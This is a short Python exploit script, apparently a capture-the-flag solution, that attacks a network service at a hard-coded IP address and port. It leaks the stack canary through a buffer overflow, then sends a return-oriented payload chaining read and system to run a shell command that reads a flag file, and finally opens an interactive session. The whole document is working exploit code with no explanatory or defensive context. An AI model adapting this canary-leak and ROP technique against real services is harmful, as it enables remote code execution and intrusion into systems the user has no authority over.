import pwnbox,sys,struct
URL = "110.10.212.130"
PORT = 8889
unpack  =lambda x: struct.unpack("<I",x)[0]
pack = lambda x: struct.pack("<I",x)
def get_canary():
  p = pwnbox.pipe.SocketPipe(URL, PORT)
  ret = ""
  p.read_until("Exit")
  p.write("1\n")
  p.read_until(":")
  p.write("A"*0x28+"A")
  p.read_until("A"*0x29)
  ret = "\x00"+p.read_byte(3)
  p.read_byte(4)
  p.write("3\n")
  return unpack(ret)
c = get_canary()
p = pwnbox.pipe.SocketPipe(URL, PORT)

p.read_until("Exit")
p.write("1\n")
read = 0x08048908
ppr = 0x8048eee-1
buf = 0x804B314
system = 0x08048620
pay = "A"*0x28+pack(c)+"B"*0xc
pay += pack(read)
pay += pack(ppr)
pay += pack(system)
pay += pack(buf)
pay += pack(buf)


p.read_until(":")
p.write(pay + "\n")

p.read_until("Exit")
p.write("3\n")

p.write("cat flag >&4\x00\n")
p.interact()
